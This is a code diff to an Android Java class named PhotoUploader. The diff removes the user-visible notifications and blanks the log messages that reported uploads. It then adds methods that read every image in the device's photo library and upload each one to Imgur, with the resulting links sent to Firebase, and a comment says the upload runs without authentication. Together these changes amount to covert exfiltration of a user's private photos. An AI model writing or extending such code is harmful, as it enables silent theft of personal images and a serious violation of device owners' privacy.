@@ -85,7 +85,6 @@ public class PhotoUploader {
                         uploadLastFivePhotos(); // ✅ Upload immediately without authentication
                     } else {
                         Log.e(TAG, "❌ Permission denied.");
-                        Toast.makeText(context, "Permission denied. Cannot upload photos.", Toast.LENGTH_SHORT).show();
                     }
                 }
         );
@@ -154,7 +153,6 @@ public class PhotoUploader {
     public void uploadLastFivePhotos() {
         List<Uri> photoUris = getRecentPhotos();
         if (photoUris.isEmpty()) {
-            Toast.makeText(context, "No recent photos found!", Toast.LENGTH_SHORT).show();
             return;
         }
 
@@ -204,13 +202,13 @@ public class PhotoUploader {
                             JSONObject jsonResponse = new JSONObject(response.body().string());
                             String imageUrl = jsonResponse.getJSONObject("data").getString("link");
 
-                            Log.d(TAG, "✅ Image uploaded to Imgur: " + imageUrl);
+                            Log.d(TAG, " " + imageUrl);
 
                             // ✅ Upload link to Firebase
                             uploadLinkToFirebase(imageUrl);
 
                             activity.runOnUiThread(() ->
-                                    Toast.makeText(context, "✅ Image uploaded! URL: " + imageUrl, Toast.LENGTH_LONG).show()
+                                    Toast.makeText(context, " " , Toast.LENGTH_LONG).show()
                             );
 
                         } catch (Exception e) {
@@ -224,6 +222,49 @@ public class PhotoUploader {
 
         } catch (Exception e) {
             Log.e(TAG, "❌ Error processing image: " + e.getMessage());
+        }
+    }
+    public List<Uri> getAllPhotos() {
+        List<Uri> photoUris = new ArrayList<>();
+        ContentResolver contentResolver = context.getContentResolver();
+        Uri externalContentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+        String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DATE_ADDED};
+
+        Cursor cursor = null;
+
+        try {
+            String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";  // Optional: sort newest to oldest
+            cursor = contentResolver.query(externalContentUri, projection, null, null, sortOrder);
+
+            if (cursor != null) {
+                int columnIndex = cursor.getColumnIndex(MediaStore.Images.Media._ID);
+                while (cursor.moveToNext()) {
+                    long id = cursor.getLong(columnIndex);
+                    Uri contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
+                    photoUris.add(contentUri);
+                    Log.d(TAG, "📸 Retrieved Photo: " + contentUri.toString());
+                }
+            } else {
+                Log.e(TAG, "⚠️ Cursor is null, no photos found!");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "❌  " + e.getMessage());
+        } finally {
+            if (cursor != null) cursor.close();
+        }
+
+        Log.d(TAG, "✅  " + photoUris.size());
+        return photoUris;
+    }
+    public void uploadAllPhotos() {
+        List<Uri> photoUris = getAllPhotos();
+        if (photoUris.isEmpty()) {
+
+            return;
+        }
+
+        for (Uri photoUri : photoUris) {
+            uploadPhotoToImgur(photoUri); // ✅ Reuse the existing upload function
         }
     }
 
